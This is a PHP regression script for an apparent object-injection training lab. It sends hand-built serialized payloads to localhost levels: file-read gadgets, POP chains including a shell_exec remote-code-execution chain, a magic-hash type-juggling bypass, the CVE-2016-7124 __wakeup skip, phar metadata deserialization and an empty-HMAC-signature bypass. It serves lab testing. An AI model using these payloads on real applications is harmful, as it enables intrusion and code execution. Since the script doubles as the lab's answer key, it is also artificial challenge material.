<?php
/**
 * PHP Object Injection Lab self-test: runs the intended POP chain / gadget for
 * every level against the live app, so a level that has quietly stopped being
 * exploitable is caught.
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Not part of the challenge - it exists so the lab can be regression-tested.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

function get(string $url): string
{
    $ctx = stream_context_create(['http' => ['timeout' => 20, 'ignore_errors' => true]]);
    return (string) @file_get_contents($url, false, $ctx);
}

function post(string $url, array $fields): string
{
    $ctx = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => http_build_query($fields),
        'timeout' => 20,
        'ignore_errors' => true,
    ]]);
    return (string) @file_get_contents($url, false, $ctx);
}

/* ── Payload construction ──────────────────────────────────────
   The gadget classes live inside levelN.php (which renders a page when
   included), so the serialized objects are assembled here by hand. Lengths
   are computed, never hardcoded, so the payloads follow the real secret path.
   ───────────────────────────────────────────────────────────── */

function s_str(string $v): string { return 's:' . strlen($v) . ':"' . $v . '";'; }

/** Serialize an object literal. Values are pre-encoded serialization fragments. */
function s_obj(string $class, array $props): string
{
    $body = '';
    foreach ($props as $name => $value) {
        $body .= s_str($name) . $value;
    }
    return 'O:' . strlen($class) . ':"' . $class . '":' . count($props) . ':{' . $body . '}';
}

/** A serialized string value (with its trailing semicolon). */
function s_val(string $v): string { return s_str($v); }

$SECRET = poi_secret_path();   // /var/secret/flag.txt inside the container

function check(int $level, string $body, string $note = ''): void
{
    global $pass, $fail;
    $want = get_flag_for_level($level);
    if ($want !== '' && strpos($body, $want) !== false) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    }
}

echo "PHP Object Injection Lab self-test\n----------------------------------\n";

/* 1 - property injection: hand back an Account whose isAdmin is a real boolean */
$p1 = s_obj('Account', ['username' => s_val('guest'), 'isAdmin' => 'b:1;']);
check(1, get("$base/level1.php?account=" . urlencode($p1)), 'isAdmin === true');

/* 2 - __destruct file-read gadget */
$p2 = s_obj('TempFile', ['path' => s_val($SECRET)]);
check(2, post("$base/level2.php", ['blob' => $p2]), '__destruct -> file_get_contents');

/* 3 - __wakeup fires during unserialize() itself */
$p3 = s_obj('SessionStore', ['file' => s_val($SECRET)]);
check(3, get("$base/level3.php?data=" . urlencode($p3)), '__wakeup during unserialize');

/* 4 - the string cast in "Preview: " . $obj fires __toString() */
$p4 = s_obj('Template', ['view' => s_val($SECRET)]);
check(4, post("$base/level4.php", ['tpl' => $p4]), '__toString on string cast');

/* 5 - POP chain: Logger::__destruct() -> FileViewer::flush() */
$inner5 = s_obj('FileViewer', ['source' => s_val($SECRET)]);
$p5     = s_obj('Logger', ['writer' => $inner5]);      // nested object: no trailing ';'
check(5, get("$base/level5.php?q=" . urlencode($p5)), 'Logger -> FileViewer');

/* 6 - type juggling: a DIFFERENT 0e magic hash is loosely == the stored one */
$p6 = s_obj('AuthToken', [
    'user'     => s_val('admin'),
    'password' => s_val('0e830400451993494058024219903391'),   // md5('QNKCDZO')
]);
check(6, post("$base/level6.php", ['auth_token' => $p6]), '0e... == 0e... loose compare');

/* 7 - CVE-2016-7124: declare more properties than are present, __wakeup is skipped */
$one = s_str('file') . s_val($SECRET);
$p7  = 'O:13:"SecureSession":2:{' . $one . '}';        // declared 2, only 1 present
check(7, get("$base/level7.php?session=" . urlencode($p7)), 'inflated property count');

/* 8 - phar metadata deserialization fires PharGadget::__wakeup() */
check(8, post("$base/level8.php", ['gadget_file' => $SECRET]), 'phar:// metadata gadget');

/* 9 - RCE POP chain: Report::__destruct() -> CommandRunner::run() -> shell_exec */
$inner9 = s_obj('CommandRunner', ['cmd' => s_val('cat ' . $SECRET)]);
$p9     = s_obj('Report', ['engine' => $inner9]);
check(9, post("$base/level9.php", ['blob' => $p9]), 'shell_exec via destructor');

/* 10 - empty signature skips the HMAC check; a file-read gadget dodges the WAF */
$p10   = s_obj('AuditTrail', ['file' => s_val($SECRET)]);
$token = base64_encode($p10) . '|';                    // trailing pipe = empty sig
check(10, post("$base/level10.php", ['token' => $token]), 'empty sig + quiet gadget');

echo "----------------------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
